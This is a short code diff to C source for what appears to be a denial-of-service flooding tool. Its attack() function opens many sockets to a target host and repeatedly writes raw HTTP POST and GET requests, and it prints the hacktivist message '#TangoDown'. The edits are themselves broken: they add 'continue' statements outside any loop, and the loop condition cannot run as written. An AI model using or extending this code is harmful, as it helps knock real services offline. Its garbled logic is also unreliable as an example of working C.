@@ -19,6 +19,7 @@ int make_socket(char *host, char *port) {
 	hints.ai_socktype = SOCK_STREAM;
 	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
 		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
+		continue;
 		
 	}
 	for(p = servinfo; p != NULL; p = p->ai_next) {
@@ -35,6 +36,7 @@ int make_socket(char *host, char *port) {
 		if(servinfo)
 		fprintf(stderr, "#TangoDown!!!!!\n");
 		
+		continue;
 	}
 	if(servinfo)
 		freeaddrinfo(servinfo);
@@ -60,7 +62,7 @@ void attack(char *host, char *port, int id) {
 		for(x=0; bytes < x; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
-			r=write(sockets[x], "POST / HTTP/1.1\r\n\r\n", bytes);
+			write(sockets[x], "POST / HTTP/1.1\r\n\r\n", bytes);
 			if(bytes < x) {
 				write(sockets[x], "GET / HTTP/1.1\r\n\r\n", bytes);
 				
